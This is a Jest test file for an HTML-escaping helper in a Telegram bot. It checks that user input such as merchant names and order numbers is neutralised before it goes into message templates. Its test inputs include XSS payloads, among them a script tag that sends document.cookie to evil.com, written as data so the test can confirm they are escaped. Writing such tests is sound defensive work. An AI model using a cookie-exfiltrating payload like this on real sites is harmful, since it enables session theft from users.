// T4.4 — Telegram HTML 安全转义测试
// 验证 HTML 注入防护

import { describe, it, expect } from '@jest/globals';

// 复制 telegram.js 中的 escapeHtml 逻辑用于独立测试
function escapeHtml(text) {
  if (!text || typeof text !== 'string') return String(text ?? '');
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

describe('Telegram HTML 转义安全', () => {
  it('基础文本不需要转义', () => {
    expect(escapeHtml('Hello World')).toBe('Hello World');
  });

  it('转义 < 标签', () => {
    expect(escapeHtml('<script>alert(1)</script>')).toBe(
      '&lt;script&gt;alert(1)&lt;/script&gt;'
    );
  });

  it('转义 & 符号', () => {
    expect(escapeHtml('Price: $10 & Free Shipping')).toBe(
      'Price: $10 &amp; Free Shipping'
    );
  });

  it('单次转义即可安全使用，不应双重转义', () => {
    const once = escapeHtml('<b>Bold</b>');
    expect(once).toBe('&lt;b&gt;Bold&lt;/b&gt;');
  });

  it('空字符串处理', () => {
    expect(escapeHtml('')).toBe('');
  });

  it('null/undefined 返回空字符串（安全默认）', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  it('数字可安全转义', () => {
    expect(escapeHtml(123)).toBe('123');
  });

  it('用户恶意输入：商家名含 HTML', () => {
    const maliciousInput = '<a href="https://evil.com">Click me</a>';
    const escaped = escapeHtml(maliciousInput);
    expect(escaped).toBe(
      '&lt;a href="https://evil.com"&gt;Click me&lt;/a&gt;'
    );
  });

  it('用户恶意输入：注入 script 标签', () => {
    expect(escapeHtml('<script>fetch("https://evil.com?c="+document.cookie)</script>'))
      .not.toContain('<script>');
  });

  it('Telegram 支持的 HTML 标签应保留（作为变量传入时已转义的）', () => {
    // Bot 消息模板中的 HTML 标签是服务端定义的，不在 escapeHtml 输入中
    // 用户输入的数据（orderNumber, reason）在拼入模板前应转义
    const userInput = '<test>';
    const template = `<b>订单号: ${escapeHtml(userInput)}</b>`;
    expect(template).toBe('<b>订单号: &lt;test&gt;</b>');
  });
});
